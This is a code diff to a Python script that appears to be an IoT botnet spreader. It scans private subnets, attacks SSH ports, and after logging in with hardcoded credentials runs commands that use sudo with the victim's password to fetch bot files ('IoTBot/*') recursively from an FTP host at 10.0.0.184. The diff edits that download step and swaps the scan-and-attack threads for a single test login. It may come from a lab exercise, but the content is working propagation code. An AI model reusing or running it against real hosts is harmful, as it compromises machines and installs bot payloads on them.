@@ -33,11 +33,11 @@ def sshLogin(user, ip, password):
         stdout = channel.makefile('rb')
 
         stdin.write(
-            '''
+        '''
         cd /home
-        mkdir kabali
+        echo ''' + password + '''| sudo -S mkdir kabali
         cd kabali 
-        wget --user=name --password=123 ftp://10.0.0.x/path
+        echo ''' + password + '''| sudo wget -r --user=user --password=abcd ftp://10.0.0.184/home/IoTBot/*
         ls
         exit
         '''
@@ -108,7 +108,7 @@ def attack(q):
             pass
         else:
             ip, port = q.get().split(':')
-            threadSafePrint(bcolors.OKCYAN , "!!!!!!!!!!!!!!!!!!!!!!!!  Trying to attack to !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!", ip, "on port ", port , bcolors.ENDC)
+            threadSafePrint(bcolors.OKCYAN , "!!!!!!!!!!!!!!!!!!!!!!!!  Trying to attack to ", ip, "on port ", port , "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!" , bcolors.ENDC)
             if port.find("22") != -1:
                 ssh(ip)
             else:
@@ -116,11 +116,12 @@ def attack(q):
 
 
 if __name__ == '__main__':
-    b = BotNet.BotNet(networks=["10.1.0.0/24", "10.2.0.0/24", "11.0.0.0/24"])
-    network = ["10.1.0.0/24", "10.2.0.0/24", "11.0.0.0/24"]
-
-    q = Queue()
-    t1 = Thread(target=scan, args=(q, network))
-    t2 = Thread(target=attack, args=(q,))
-    t1.start()
-    t2.start()
+    # b = BotNet.BotNet(networks=["10.1.0.0/24", "10.2.0.0/24", "11.0.0.0/24"])
+    # network = ["10.1.0.0/24", "10.2.0.0/24", "11.0.0.0/24"]
+    #
+    # q = Queue()
+    # t1 = Thread(target=scan, args=(q, network))
+    # t2 = Thread(target=attack, args=(q,))
+    # t1.start()
+    # t2.start()
+    sshLogin("user", "10.1.0.114", "abcd")
